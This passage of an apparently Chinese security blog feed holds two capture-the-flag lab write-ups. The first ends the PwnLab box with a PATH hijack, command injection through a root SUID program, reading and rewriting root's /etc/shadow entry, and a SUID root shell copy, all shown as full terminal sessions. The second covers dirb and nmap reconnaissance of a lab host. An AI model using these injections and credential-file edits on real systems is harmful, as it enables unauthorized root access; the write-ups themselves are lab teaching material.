<p>修改当前目录下的cat文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~$ <span class="built_in">echo</span> <span class="string">&quot;/bin/bash;ls &quot;</span> &gt; <span class="built_in">cat</span></span><br></pre></td></tr></table></figure>
再次运行<strong>./msgmike</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line">mike@pwnlab:~$</span><br></pre></td></tr></table></figure>
<p>现在是属主为root用户的suid文件,和上述套路一致 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 2 mike mike 4096 Mar 17  2016 .</span><br><span class="line">drwxr-xr-x 6 root root 4096 Mar 17  2016 ..</span><br><span class="line">-rw-r--r-- 1 mike mike  220 Mar 17  2016 .bash_logout</span><br><span class="line">-rw-r--r-- 1 mike mike 3515 Mar 17  2016 .bashrc</span><br><span class="line">-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root</span><br><span class="line">-rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>执行一遍</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root                                                                                                                                                                                                </span><br><span class="line">Message <span class="keyword">for</span> root: flag&#123;T5566Y&#125;                                                                                                                                                                            </span><br><span class="line">flag&#123;T5566Y&#125;                                                                                                                                                                                              </span><br><span class="line">flag&#123;T5566Y&#125; </span><br></pre></td></tr></table></figure>
<p>复制到tmp目录下,蚁剑查看内容</p>
<p>猜测代码为 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/bin/echo %s &gt;&gt; /root/messages.txt</span><br></pre></td></tr></table></figure></p>
<p>猜测源代码为 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">// printf(&quot;helloworld\n&quot;);</span></span><br><span class="line">	<span class="type">char</span> a[];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;a);</span><br><span class="line">	<span class="comment">// printf(a);</span></span><br><span class="line">	<span class="type">char</span> s[<span class="number">500</span>];</span><br><span class="line">	<span class="built_in">sprintf</span>(s,<span class="string">&quot;/bin/echo %s &gt;&gt; /root/messages.txt&quot;</span>,a);</span><br><span class="line">	<span class="comment">// system(&quot;/bin/echo %s &gt;&gt; /root/messages.txt&quot;,a);</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s);</span><br><span class="line">	system(s);</span><br><span class="line">	<span class="comment">// printf(&quot;%s\n&quot;,a );</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a;sed -i <span class="string">&#x27;s@^root.*@root:$6$k/mtF8Ic$.whWyn0EQI4q3rucHh3iYK.E6gTmbG3l1KoaQpnFrvs.bD2gw.JCvip1Jt4As5Vz7XKvgWAOz0L/iwaM2aDwp/:18042:0:99999:7:::@g$&#x27;</span> /etc/shadow;<span class="built_in">echo</span> 0</span><br><span class="line"></span><br><span class="line">/bin/echo <span class="string">&quot;&quot;</span>;sed <span class="string">&quot;s@^root.*@root:$6<span class="variable">$k</span>/mtF8Ic$.whWyn0EQI4q3rucHh3iYK.E6gTmbG3l1KoaQpnFrvs.bD2gw.JCvip1Jt4As5Vz7XKvgWAOz0L/iwaM2aDwp/:18042:0:99999:7:::@g&quot;</span> /etc/shadow;<span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt;&gt; /root/messages.txt</span><br><span class="line">a;a=\&quot;;<span class="built_in">echo</span> <span class="variable">$a</span>;<span class="built_in">echo</span> a</span><br></pre></td></tr></table></figure>
<p>sed 可以看出来是直接返回我输入的内容
但是如果我输入的是带反引号的语句呢? <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`/bin/bash`</span><br></pre></td></tr></table></figure></p>
<p>上面的实践无效</p>
<p>不行,深夜,我想到还是用普通的语句的老老实实的换吧 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message <span class="keyword">for</span> root: <span class="string">&quot;&quot;</span>;grep <span class="string">&quot;root&quot;</span> /etc/shadow;<span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;</span>;grep <span class="string">&quot;root&quot;</span> /etc/shadow;<span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">root:$6$aYZMZ3V0<span class="variable">$qAYwiR7aanVmKSWyV5IbRffspdjFx4xhLrm8kbHhh1DG16Bdb0</span>/ptImcDK2uT.6xc/FZotacYr0X4dB0SurjD/:16877:0:99999:7:::</span><br><span class="line"></span><br><span class="line"><span class="comment"># root:$6$k/mtF8Ic$.whWyn0EQI4q3rucHh3iYK.E6gTmbG3l1KoaQpnFrvs.bD2gw.JCvip1Jt4As5Vz7XKvgWAOz0L/iwaM2aDwp/:16877:0:99999:7:::</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message <span class="keyword">for</span> root: <span class="string">&quot;&quot;</span>;<span class="built_in">cp</span> /bin/bash /home/kane/sh;<span class="built_in">chmod</span> +s /home/kane/sh;<span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;</span>;<span class="built_in">cp</span> /bin/bash /home/kane/sh;<span class="built_in">chmod</span> +s /home/kane/sh;<span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mike@pwnlab:/home/mike$ <span class="built_in">cd</span> </span><br><span class="line"><span class="built_in">cd</span> </span><br><span class="line">mike@pwnlab:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span>  flag_wrong.txt  msgmike  sh  tq</span><br><span class="line">mike@pwnlab:~$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 1160</span><br><span class="line">drwxr-x--- 2 kane kane    4096 May 26 17:47 .</span><br><span class="line">drwxr-xr-x 6 root root    4096 Mar 17  2016 ..</span><br><span class="line">-rw------- 1 kane kane    1245 May 26 10:36 .bash_history</span><br><span class="line">-rw-r--r-- 1 kane kane     220 Mar 17  2016 .bash_logout</span><br><span class="line">-rw-r--r-- 1 kane kane    3515 Mar 17  2016 .bashrc</span><br><span class="line">-rwxrwxrwx 1 kane kane      14 May 26 17:01 <span class="built_in">cat</span></span><br><span class="line">-rw-r--r-- 1 root root      13 Apr 25 10:32 flag_wrong.txt</span><br><span class="line">-rwsr-sr-x 1 mike mike    5148 Mar 17  2016 msgmike</span><br><span class="line">-rw-r--r-- 1 kane kane     675 Mar 17  2016 .profile</span><br><span class="line">-rwsr-sr-x 1 root root 1105840 May 26 17:47 sh</span><br><span class="line">-rwsr-sr-x 1 root root   38868 May 26 17:42 tq</span><br><span class="line">mike@pwnlab:~$ sh</span><br><span class="line">sh</span><br><span class="line">sh-4.3<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">sh-4.3<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>引用一下几个文件/etc/bash.bashrc /etc/profile /root/.profile
/root/.bashrc 然后用vi强行修改/etc/shadow文件,登陆成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@pwnlab:/home/kane# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@pwnlab:~<span class="comment"># cat flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line">.-=~=-.                                                                 .-=~=-.</span><br><span class="line">(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)</span><br><span class="line">(_ ___)  _____                             _                            (_ ___)</span><br><span class="line">(__  _) /  __ \                           | |                           (__  _)</span><br><span class="line">( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)</span><br><span class="line">(__  _) | |    / _ \| <span class="string">&#x27;_ \ / _` | &#x27;</span>__/ _` | __/ __|                     (__  _)</span><br><span class="line">(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)</span><br><span class="line">(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)</span><br><span class="line">( _ __)                     __/ |                                       ( _ __)</span><br><span class="line">(__  _)                    |___/                                        (__  _)</span><br><span class="line">(__  _)                                                                 (__  _)</span><br><span class="line">(_ ___) If  you are  reading this,  means  that you have  <span class="built_in">break</span> <span class="string">&#x27;init&#x27;</span>  (_ ___)</span><br><span class="line">( _ __) Pwnlab.  I hope  you enjoyed  and thanks  <span class="keyword">for</span>  your time doing  ( _ __)</span><br><span class="line">(__  _) this challenge.                                                 (__  _)</span><br><span class="line">(_ ___)                                                                 (_ ___)</span><br><span class="line">( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)</span><br><span class="line">(__  _) reading it                                                      (__  _)</span><br><span class="line">(__  _)                                                                 (__  _)</span><br><span class="line">(__  _)                                             For sniferl4bs.com  (__  _)</span><br><span class="line">( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)</span><br><span class="line">(__  _)                                                                 (__  _)</span><br><span class="line">(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)</span><br><span class="line">`-._.-<span class="string">&#x27;                                                                 `-._.-&#x27;</span></span><br><span class="line">root@pwnlab:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/rbash&#x27;)&quot;</span><br><span class="line">su kane -c &quot;iSv5Ym2GRo&quot;</span><br><span class="line">cd /home/kane</span><br><span class="line">export PATH=/home/kane:$PATH</span><br><span class="line">echo &quot;/bin/bash;ls &quot; &gt; cat</span><br><span class="line">./msgmike</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title>靶场8</title>
    <url>/%E9%9D%B6%E5%9C%BA8/</url>
    <content><![CDATA[<h1 id="靶场八">靶场八</h1>
<p>看网页源代码,得到flag1<code>flag1&#123;Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=&#125;</code></p>
<p>解码得到<code>CIA – Operation Treadstone</code> cwel
爬取字典<code>https://bourne.fandom.com/wiki/Operation_Treadstone</code>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [21:12:08] C:130</span></span><br><span class="line">$ dirb http://172.17.135.8/ -S </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri May 31 21:12:11 2019</span><br><span class="line">URL_BASE: http://172.17.135.8/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">OPTION: Silent Mode</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.8/ ----</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/admin/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/css/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/db/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/dist/</span><br><span class="line">+ http://172.17.135.8/index.php (CODE:200|SIZE:2433)</span><br><span class="line">+ http://172.17.135.8/server-status (CODE:403|SIZE:292)</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/squirrelmail/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/supplier/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/upload/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/user/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/vendor/</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [21:49:01] </span></span><br><span class="line">$ nmap 172.17.135.8 -Pn -sS                        </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-31 22:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.8</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">21/tcp  open  ftp</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">143/tcp open  imap</span><br><span class="line">993/tcp open  imaps</span><br><span class="line">995/tcp open  pop3s</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 20.90 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [21:14:25] C:130</span></span><br><span class="line">$ nmap 172.17.135.8 -A -O -sS</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-31 21:14 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.8</span><br><span class="line">Host is up (0.0020s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">21/tcp  open  ftp      vsftpd 3.0.2</span><br><span class="line">22/tcp  open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 a9:98:84:aa:90:7e:f1:e6:be:c0:84:3e:fa:aa:83:8a (DSA)</span><br><span class="line">|   2048 07:5c:77:15:30:5a:17:95:8e:0f:91:f0:2d:0b:c3:7a (RSA)</span><br><span class="line">|_  256 2f:9c:29:b5:f5:dc:f4:95:07:6d:41:ee:f9:0d:15:b8 (ECDSA)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: BlackMarket Weapon Management System</span><br><span class="line">110/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE SASL STLS PIPELINING RESP-CODES UIDL CAPA TOP</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">143/tcp open  imap     Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: listed OK IDLE more ID ENABLE LOGIN-REFERRALS LITERAL+ STARTTLS post-login capabilities SASL-IR Pre-login LOGINDISABLEDA0001 have IMAP4rev1</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">993/tcp open  ssl/imap Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: listed OK IDLE IMAP4rev1 AUTH=PLAINA0001 LOGIN-REFERRALS LITERAL+ post-login more ID SASL-IR capabilities Pre-login have ENABLE</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">995/tcp open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER PIPELINING RESP-CODES UIDL CAPA TOP</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.2, Linux 3.16 - 4.6, Linux 3.2 - 4.6, Linux 4.4</span><br><span class="line">Network Distance: 3 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   ...</span><br><span class="line">2   5.15 ms bogon (192.168.230.30)</span><br><span class="line">3   3.27 ms 172.17.135.8</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 26.36 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>配置漏洞扫描器 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/nmap/scripts/</span><br><span class="line">git clone https://github.com/vulnersCom/nmap-vulners.git</span><br><span class="line">git clone https://github.com/scipag/vulscan.git</span><br><span class="line">cd vulscan/utilities/updater/</span><br><span class="line">chmod +x updateFiles.sh</span><br><span class="line">./updateFiles.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script vulscan  -sV 172.17.135.8</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
</search>
